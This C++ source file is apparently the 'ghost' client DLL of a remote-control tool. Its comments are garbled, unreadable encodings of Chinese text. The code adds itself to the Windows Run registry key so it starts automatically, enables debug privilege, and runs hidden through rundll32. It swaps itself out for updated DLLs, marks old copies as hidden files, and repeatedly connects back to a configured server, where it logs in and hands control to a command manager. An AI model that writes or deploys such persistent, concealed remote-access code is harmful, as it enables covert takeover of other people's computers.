// ClientDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "Common.h"
#include "IOCPClient.h"
#include <IOSTREAM>
#include "LoginServer.h"
#include "KernelManager.h"
#include <iosfwd>
#include <vector>
#include <iostream>
#include <fstream>
#include <sstream>
#include <shellapi.h>
#include <corecrt_io.h>

// �Զ�����ע����е�ֵ
#define REG_NAME "a_ghost"

// �����Ŀͻ��˸���
#define CLIENT_PARALLEL_NUM 1

// �ͻ����ࣺ��ȫ�ֱ��������һ��.
// ���տͻ���ֻ��2��ȫ�ֱ���: g_SETTINGS��g_MyApp����g_SETTINGS��Ϊg_MyApp�ĳ�Ա.
// ���ȫ������ֻ��һ��ȫ�ֱ���: g_MyApp
typedef struct ClientApp
{
	BOOL			g_bExit;			// Ӧ�ó���״̬��1-���ض��˳� 2-���ض��˳� 3-����������
	BOOL			g_bThreadExit;		// �����߳�״̬
	HINSTANCE		g_hInstance;		// ���̾��
	CONNECT_ADDRESS *g_Connection;		// ������Ϣ
	HANDLE			g_hEvent;			// ȫ���¼�
}ClientApp;

// Զ�̵�ַ
CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "127.0.0.1", "6543", CLIENT_TYPE_DLL};

// Ӧ�ó���
ClientApp g_MyApp = { FALSE, FALSE, NULL, &g_SETTINGS, NULL };

// ���������̣߳�����Ϊ��ClientApp
DWORD WINAPI StartClient(LPVOID lParam);

#if _CONSOLE

enum { E_RUN, E_STOP } status;

//����Ȩ��
void DebugPrivilege()
{
	HANDLE hToken = NULL;
	//�򿪵�ǰ���̵ķ�������
	int hRet = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);

	if (hRet)
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		//ȡ������Ȩ�޵�LUID
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		//�����������Ƶ�Ȩ��
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

		CloseHandle(hToken);
	}
}

/**
* @brief ���ñ�����������
* @param[in] *sPath ע����·��
* @param[in] *sNmae ע���������
* @return ����ע����
* @details Win7 64λ�����ϲ��Խ��������ע�����ڣ�\n
* HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
* @note �״�������Ҫ�Թ���ԱȨ�����У�������ע���д�뿪��������
*/
BOOL SetSelfStart(const char* sPath, const char* sNmae)
{
	DebugPrivilege();

	// д���ע���·��
#define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"

	// ��ע�����д��������Ϣ
	HKEY hKey = NULL;
	LONG lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);

	// �ж��Ƿ�ɹ�
	if (lRet != ERROR_SUCCESS)
		return FALSE;

	lRet = RegSetValueExA(hKey, sNmae, 0, REG_SZ, (const BYTE*)sPath, strlen(sPath) + 1);

	// �ر�ע���
	RegCloseKey(hKey);

	// �ж��Ƿ�ɹ�
	return lRet == ERROR_SUCCESS;
}

// ���ؿ���̨
// �ο���https://blog.csdn.net/lijia11080117/article/details/44916647
// step1: ��������"�߼�"������ڵ�ΪmainCRTStartup
// step2: ��������"ϵͳ"����ϵͳΪ����
// ���

BOOL CALLBACK callback(DWORD CtrlType)
{
	if (CtrlType == CTRL_CLOSE_EVENT)
	{
		g_MyApp.g_bExit = true;
		while (E_RUN == status)
			Sleep(20);
	}
	return TRUE;
}

// �߳�`StartClientApp`����������.
typedef struct ClientStartArg 
{
	int				ID;			// �̷߳��ش���
	ClientApp		App;		// �ͻ��˶���
	const char*		IP;			// Զ��IP
	int				Port;		// Զ�̶˿�
}ClientStartArg;


DWORD StartClientApp(int id, ClientApp &app, const char *ip, int port) {
	CONNECT_ADDRESS& settings(*(app.g_Connection));
	BOOL& bExit(app.g_bExit);
	if (ip != NULL && port > 0)
	{
		settings.SetServer(ip, port);
	}
	if (strlen(settings.ServerIP()) == 0 || settings.ServerPort() <= 0) {
		Mprintf("��������: ���ṩԶ������IP�Ͷ˿�!\n");
		Sleep(3000);
		return -1;
	}
	app.g_hInstance = GetModuleHandle(NULL);
	Mprintf("[server: %d] %s:%d HINSTANCE: %p\n", id, settings.ServerIP(), settings.ServerPort(), app.g_hInstance);

	do {
		bExit = 0;
		HANDLE hThread = CreateThread(NULL, 0, StartClient, &app, 0, NULL);

		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	} while (E_RUN == status && 1 != bExit);

	return id;
}


DWORD WINAPI StartClientApp(LPVOID param) {
	ClientStartArg* a = (ClientStartArg*)param;
	auto r = StartClientApp(a->ID, a->App, a->IP, a->Port);
	SAFE_DELETE(a);
	return r;
}


/**
 * @brief �ȴ���������֧�ֳ���MAXIMUM_WAIT_OBJECTS���ƣ�
 * @param handles �������
 * @param waitAll �Ƿ�ȴ����о����ɣ�TRUE=ȫ��, FALSE=����һ����
 * @param timeout ��ʱʱ�䣨���룬INFINITE��ʾ���޵ȴ���
 * @return �ȴ������WAIT_OBJECT_0�ɹ�, WAIT_FAILEDʧ�ܣ�
 */
DWORD WaitForMultipleHandlesEx(
	const std::vector<HANDLE>& handles,
	BOOL waitAll = TRUE,
	DWORD timeout = INFINITE
) {
	const DWORD MAX_WAIT = MAXIMUM_WAIT_OBJECTS; // ϵͳ���ƣ�64��
	DWORD totalHandles = static_cast<DWORD>(handles.size());

	// 1. �������Ч��
	for (HANDLE h : handles) {
		if (h == NULL || h == INVALID_HANDLE_VALUE) {
			SetLastError(ERROR_INVALID_HANDLE);
			return WAIT_FAILED;
		}
	}

	// 2. ����������64��ֱ�ӵ���ԭ��API
	if (totalHandles <= MAX_WAIT) {
		return WaitForMultipleObjects(totalHandles, handles.data(), waitAll, timeout);
	}

	// 3. �����ȴ��߼�
	if (waitAll) {
		// ����ȴ����о�����
		for (DWORD i = 0; i < totalHandles; i += MAX_WAIT) {
			DWORD batchSize = min(MAX_WAIT, totalHandles - i);
			DWORD result = WaitForMultipleObjects(
				batchSize,
				&handles[i],
				TRUE,  // ����ȴ���ǰ����ȫ�����
				timeout
			);
			if (result == WAIT_FAILED) {
				return WAIT_FAILED;
			}
		}
		return WAIT_OBJECT_0;
	}
	else {
		// ֻ��ȴ�����һ��������
		while (true) {
			for (DWORD i = 0; i < totalHandles; i += MAX_WAIT) {
				DWORD batchSize = min(MAX_WAIT, totalHandles - i);
				DWORD result = WaitForMultipleObjects(
					batchSize,
					&handles[i],
					FALSE,  // ��ǰ��������һ����ɼ���
					timeout
				);
				if (result != WAIT_FAILED && result != WAIT_TIMEOUT) {
					return result + i; // ����ȫ������
				}
			}
			if (timeout != INFINITE) {
				return WAIT_TIMEOUT;
			}
		}
	}
}

int main(int argc, const char *argv[])
{
	if (!SetSelfStart(argv[0], REG_NAME))
	{
		Mprintf("���ÿ���������ʧ�ܣ����ù���ԱȨ������.\n");
	}

	status = E_RUN;

	HANDLE hMutex = ::CreateMutexA(NULL, TRUE, "ghost.exe");
	if (ERROR_ALREADY_EXISTS == GetLastError())
	{
		CloseHandle(hMutex);
		return -2;
	}
	
	SetConsoleCtrlHandler(&callback, TRUE);
	const char* ip = argc > 1 ? argv[1] : NULL;
	int port = argc > 2 ? atoi(argv[2]) : 0;
	g_MyApp.g_Connection->SetType(CLIENT_TYPE_ONE);
	if (CLIENT_PARALLEL_NUM == 1) {
		// ���������ͻ���
		StartClientApp(0, g_MyApp, ip, port);
	} else {
		std::vector<HANDLE> handles(CLIENT_PARALLEL_NUM);
		for (int i = 0; i < CLIENT_PARALLEL_NUM; i++) {
			handles[i] = CreateThread(0, 64*1024, StartClientApp, new ClientStartArg{ i, g_MyApp, ip, port }, 0, 0);
			if (handles[i] == 0) {
				Mprintf("�߳� %d ����ʧ�ܣ�����: %d\n", i, errno);
			}
		}
		DWORD result = WaitForMultipleHandlesEx(handles, TRUE, INFINITE);
		if (result == WAIT_FAILED) {
			Mprintf("WaitForMultipleObjects ʧ�ܣ��������: %d\n", GetLastError());
		}
	}

	status = E_STOP;

	CloseHandle(hMutex);
	return 0;
}
#else

BOOL APIENTRY DllMain( HINSTANCE hInstance, 
					  DWORD  ul_reason_for_call, 
					  LPVOID lpReserved
					  )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:	
	case DLL_THREAD_ATTACH:
		{
			g_MyApp.g_hInstance = (HINSTANCE)hInstance;

			break;
		}		
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

// ��������һ��ghost
extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
{
	ClientApp& app(g_MyApp);
	CONNECT_ADDRESS& settings(*(app.g_Connection));
	app.g_bExit = FALSE;
	if (strlen(szServerIP)>0 && uPort>0)
	{
		settings.SetServer(szServerIP, uPort);
	}

	HANDLE hThread = CreateThread(NULL,0,StartClient, &app,0,NULL);
	if (hThread == NULL) {
		return;
	}
#ifdef _DEBUG
	WaitForSingleObject(hThread, INFINITE);
#else
	WaitForSingleObject(hThread, INFINITE);
#endif
	CloseHandle(hThread);
}

// ֹͣ����
extern "C" __declspec(dllexport) void StopRun() { g_MyApp.g_bExit = true; }

// �Ƿ�ɹ�ֹͣ
extern "C" __declspec(dllexport) bool IsStoped() { return g_MyApp.g_bThreadExit; }

// �Ƿ��˳��ͻ���
extern "C" __declspec(dllexport) BOOL IsExit() { return g_MyApp.g_bExit; }

// �����д˳��������κβ���
extern "C" __declspec(dllexport) int EasyRun() {
	ClientApp& app(g_MyApp);
	CONNECT_ADDRESS& settings(*(app.g_Connection));

	do {
		TestRun((char*)settings.ServerIP(), settings.ServerPort());
		while (!IsStoped())
			Sleep(50);
		if (1 == app.g_bExit) // �ܿض��˳�
			break;
		else if (2 == app.g_bExit)
			continue;
		else // 3: �������
			break;
	} while (true);

	return app.g_bExit;
}

// copy from: SimpleRemoter\client\test.cpp
// �����µ�DLL
void RunNewDll(const char* cmdLine) {
	char path[_MAX_PATH], * p = path;
	GetModuleFileNameA(NULL, path, sizeof(path));
	while (*p) ++p;
	while ('\\' != *p) --p;
	*(p + 1) = 0;
	std::string folder = path;
	std::string oldFile = folder + "ServerDll.old";
	std::string newFile = folder + "ServerDll.new";
	strcpy(p + 1, "ServerDll.dll");
	BOOL ok = TRUE;
	if (_access(newFile.c_str(), 0) != -1) {
		if (_access(oldFile.c_str(), 0) != -1)
		{
			if (!DeleteFileA(oldFile.c_str()))
			{
				Mprintf("Error deleting file. Error code: %d\n", GetLastError());
				ok = FALSE;
			}
		}
		if (ok && !MoveFileA(path, oldFile.c_str())) {
			Mprintf("Error removing file. Error code: %d\n", GetLastError());
			if (_access(path, 0) != -1)
			{
				ok = FALSE;
			}
		}
		else {
			// �����ļ�����Ϊ����
			if (SetFileAttributesA(oldFile.c_str(), FILE_ATTRIBUTE_HIDDEN))
			{
				Mprintf("File created and set to hidden: %s\n", oldFile.c_str());
			}
		}
		if (ok && !MoveFileA(newFile.c_str(), path)) {
			Mprintf("Error removing file. Error code: %d\n", GetLastError());
			MoveFileA(oldFile.c_str(), path);// recover
		}
		else if (ok) {
			Mprintf("Using new file: %s\n", newFile.c_str());
		}
	}
	char cmd[1024];
	sprintf_s(cmd, "%s,Run %s", path, cmdLine);
	ShellExecuteA(NULL, "open", "rundll32.exe", cmd, NULL, SW_HIDE);
}

/* ���пͻ��˵ĺ��Ĵ���. ��Ϊ���嵼������, ���� rundll32 ����Լ��.
HWND hwnd: �����ھ����ͨ��Ϊ NULL����
HINSTANCE hinst: DLL ��ʵ�������
LPSTR lpszCmdLine: �����в�������Ϊ�ַ������ݸ�������
int nCmdShow: ������ʾ״̬��
�������rundll32.exe ClientDemo.dll,Run 127.0.0.1:6543
���ȴ������в����ж�ȡ������ַ�������ָ�������ʹ�ȫ�ֱ�����ȡ��
*/
extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
	ClientApp& app(g_MyApp);
	CONNECT_ADDRESS& settings(*(app.g_Connection));
	BOOL& bExit(app.g_bExit);
	char message[256] = { 0 };
	if (strlen(lpszCmdLine) != 0) {
		strcpy_s(message, lpszCmdLine);
	}else if (settings.IsValid())
	{
		sprintf_s(message, "%s:%d", settings.ServerIP(), settings.ServerPort());
	}

	std::istringstream stream(message);
	std::string item;
	std::vector<std::string> result;
	while (std::getline(stream, item, ':')) {
		result.push_back(item);
	}
	if (result.size() == 1)
	{
		result.push_back("80");
	}
	if (result.size() != 2) {
		MessageBox(hwnd, "���ṩ��ȷ��������ַ!", "��ʾ", MB_OK);
		return;
	}
	
	do {
		TestRun((char*)result[0].c_str(), atoi(result[1].c_str()));
		while (!IsStoped())
			Sleep(20);
		if (bExit == 1)
			return;
		else if (bExit == 2)
			continue;
		else // 3
			break;
	} while (true);

	sprintf_s(message, "%s:%d", settings.ServerIP(), settings.ServerPort());
	RunNewDll(message);
}

#endif

DWORD WINAPI StartClient(LPVOID lParam)
{
	ClientApp& app(*(ClientApp*)lParam);
	CONNECT_ADDRESS& settings(*(app.g_Connection));
	BOOL& bExit(app.g_bExit);
	IOCPClient  *ClientObject = new IOCPClient(bExit);

	if (NULL == app.g_hEvent)
		app.g_hEvent = CreateEventA(NULL, TRUE, FALSE, EVENT_FINISHED);
	if (app.g_hEvent == NULL) {
		Mprintf("[StartClient] Failed to create event: %s! %d.\n", EVENT_FINISHED, GetLastError());
	}

	app.g_bThreadExit = false;
	while (!bExit)
	{
		ULONGLONG dwTickCount = GetTickCount64();
		if (!ClientObject->ConnectServer(settings.ServerIP(), settings.ServerPort()))
		{
			for (int k = 500; !bExit && --k; Sleep(10));
			continue;
		}
		//׼����һ������
		LOGIN_INFOR login = GetLoginInfo(GetTickCount64() - dwTickCount, settings.ClientType());
		ClientObject->SendLoginInfo(login);

		CKernelManager	*Manager = new CKernelManager(&settings, ClientObject, app.g_hInstance);
		do 
		{
			Manager->SendHeartbeat();
		} while (ClientObject->IsRunning() && ClientObject->IsConnected() && !bExit);
		while (GetTickCount64() - dwTickCount < 5000 && !bExit)
			Sleep(200);

		delete Manager;
	}
	if (app.g_bExit == 1 && app.g_hEvent) {
		BOOL b = SetEvent(app.g_hEvent);
		Mprintf(">>> [StartClient] Set event: %s %s!\n", EVENT_FINISHED, b ? "succeed" : "failed");

		CloseHandle(app.g_hEvent);
		app.g_hEvent = NULL;
	}

	Mprintf("StartClient end\n");
	delete ClientObject;
	app.g_bThreadExit = true;

	return 0;
} 
